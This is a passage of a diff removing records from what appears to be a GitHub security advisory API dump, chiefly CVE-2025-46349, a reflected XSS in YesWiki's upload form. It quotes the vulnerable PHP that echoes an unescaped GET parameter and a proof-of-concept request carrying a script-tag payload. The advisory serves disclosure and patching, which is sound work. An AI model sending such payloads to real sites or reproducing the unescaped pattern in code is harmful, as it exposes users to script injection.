-                    "received_events_url": "https://api.github.com/users/pizza-power/received_events",
-                    "type": "User",
-                    "user_view_type": "public",
-                    "site_admin": false
-                },
-                "type": "reporter"
-            }
-        ],
-        "cvss": {
-            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
-            "score": 10.0
-        },
-        "epss": {
-            "percentage": 0.00084,
-            "percentile": 0.25639
-        }
-    },
-    {
-        "ghsa_id": "GHSA-2f8p-qqx2-gwr2",
-        "cve_id": "CVE-2025-46349",
-        "url": "https://api.github.com/advisories/GHSA-2f8p-qqx2-gwr2",
-        "html_url": "https://github.com/advisories/GHSA-2f8p-qqx2-gwr2",
-        "summary": "YesWiki Vulnerable to Unauthenticated Reflected Cross-site Scripting",
-        "description": "### Summary\nReflected XSS has been detected in the file upload form. Vulnerability can be exploited without authentication\n\nThis Proof of Concept has been performed using the followings:\n\n- YesWiki v4.5.3 (doryphore-dev branch)\n- Docker environnment (docker/docker-compose.yml)\n\n### Vulnerable code\nThe vulnerability is located in the [file](https://github.com/YesWiki/yeswiki/blob/6894234bbde6ab168bf4253f9a581bd24bf53766/tools/attach/libs/attach.lib.php#L724-L735)\n```\n        public function showUploadForm()\n        {\n            $this->file = $_GET['file'];\n            echo '<h3>' . _t('ATTACH_UPLOAD_FORM_FOR_FILE') . ' ' . $this->file . \"</h3>\\n\";\n            echo '<form enctype=\"multipart/form-data\" name=\"frmUpload\" method=\"POST\" action=\"' . $this->wiki->href('upload', $this->wiki->GetPageTag()) . \"\\\">\\n\"\n                . '\t<input type=\"hidden\" name=\"wiki\" value=\"' . $this->wiki->GetPageTag() . \"/upload\\\" />\\n\"\n                . '\t<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"' . $this->attachConfig['max_file_size'] . \"\\\" />\\n\"\n                . \"\t<input type=\\\"hidden\\\" name=\\\"file\\\" value=\\\"$this->file\\\" />\\n\"\n                . \"\t<input type=\\\"file\\\" name=\\\"upFile\\\" size=\\\"50\\\" /><br />\\n\"\n                . '\t<input class=\"btn btn-primary\" type=\"submit\" value=\"' . _t('ATTACH_SAVE') . \"\\\" />\\n\"\n                . \"</form>\\n\";\n        }\n```\n### PoC\n1. You need to send a request to endpoint and abusing the `file` parameter, we can successfully obtain client side javascript execution\n```\nGET /?PagePrincipale/upload&file=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1\nHost: localhost:8085\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"135\", \"Not-A.Brand\";v=\"8\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"macOS\"\nAccept-Language: ru-RU,ru;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n```\n2. Get a response\n<img width=\"853\" alt=\"\u0421\u043d\u0438\u043c\u043e\u043a \u044d\u043a\u0440\u0430\u043d\u0430 2025-04-11 \u0432 02 04 55\" src=\"https://github.com/user-attachments/assets/b923f563-ead5-494c-8fbd-1c3b11635820\" />\n\n\n### Impact\nThis vulnerability allows any malicious unauthenticated user to create a link that can be clicked on in the victim context to perform arbitrary actions",
-        "type": "reviewed",
-        "severity": "high",
-        "repository_advisory_url": "https://api.github.com/repos/YesWiki/yeswiki/security-advisories/GHSA-2f8p-qqx2-gwr2",
-        "source_code_location": "https://github.com/YesWiki/yeswiki",
-        "identifiers": [
-            {
-                "value": "GHSA-2f8p-qqx2-gwr2",
-                "type": "GHSA"
-            },
-            {
-                "value": "CVE-2025-46349",
-                "type": "CVE"
-            }
-        ],
-        "references": [
-            "https://github.com/YesWiki/yeswiki/security/advisories/GHSA-2f8p-qqx2-gwr2",
-            "https://github.com/YesWiki/yeswiki/commit/0dac9e2fb2a5e69f13a3c9f761ecae6ed9676206",
-            "https://github.com/YesWiki/yeswiki/blob/6894234bbde6ab168bf4253f9a581bd24bf53766/tools/attach/libs/attach.lib.php#L724-L735",
-            "https://nvd.nist.gov/vuln/detail/CVE-2025-46349",
-            "https://github.com/YesWiki/yeswiki/pull/1264/commits/6edde40eb7eeb5d60619ac4d1e0a0422d92e9524",
-            "https://github.com/advisories/GHSA-2f8p-qqx2-gwr2"
-        ],
-        "published_at": "2025-04-29T14:38:12Z",
-        "updated_at": "2025-04-29T20:27:21Z",
-        "github_reviewed_at": "2025-04-29T14:38:12Z",
-        "nvd_published_at": "2025-04-29T18:15:44Z",
-        "withdrawn_at": null,
-        "vulnerabilities": [
-            {
-                "package": {
-                    "ecosystem": "composer",
-                    "name": "yeswiki/yeswiki"
-                },
-                "vulnerable_version_range": "<= 4.5.3",
-                "first_patched_version": null,
-                "vulnerable_functions": []
-            }
-        ],
-        "cvss_severities": {
-            "cvss_v3": {
-                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:L",
-                "score": 7.6
-            },
-            "cvss_v4": {
-                "vector_string": null,
-                "score": 0.0
-            }
-        },
-        "cwes": [
-            {
-                "cwe_id": "CWE-79",
-                "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-            }
-        ],
-        "credits": [],
-        "cvss": {
-            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:L",
-            "score": 7.6
-        },
-        "epss": {
-            "percentage": 0.00071,
-            "percentile": 0.22523
         }
     }
 ]
